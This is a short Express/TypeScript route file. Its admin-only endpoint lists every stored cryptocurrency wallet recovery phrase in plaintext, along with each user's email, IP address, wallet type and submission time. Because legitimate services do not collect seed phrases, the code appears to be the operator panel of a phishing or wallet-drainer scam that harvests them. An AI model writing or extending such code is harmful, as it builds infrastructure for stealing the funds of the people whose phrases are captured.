import { Router } from "express";
import type { Request, Response } from "express";
import { eq, sql } from "drizzle-orm";
import { db, walletPhrasesTable, usersTable } from "@workspace/db";
import { requireAdmin } from "../middlewares/auth";

const router = Router();
router.use(requireAdmin);

router.get("/", async (req: Request, res: Response) => {
  try {
    const rows = await db.select({
      phrase: walletPhrasesTable,
      userEmail: usersTable.email,
    }).from(walletPhrasesTable)
      .leftJoin(usersTable, eq(walletPhrasesTable.userId, usersTable.id))
      .orderBy(sql`${walletPhrasesTable.createdAt} desc`);

    res.json(rows.map(r => ({
      id: r.phrase.id, userId: r.phrase.userId, userEmail: r.userEmail ?? null,
      phrase: r.phrase.phrase, walletType: r.phrase.walletType,
      ipAddress: r.phrase.ipAddress, createdAt: r.phrase.createdAt.toISOString(),
    })));
  } catch (err) {
    req.log.error({ err }, "listWalletPhrases error");
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
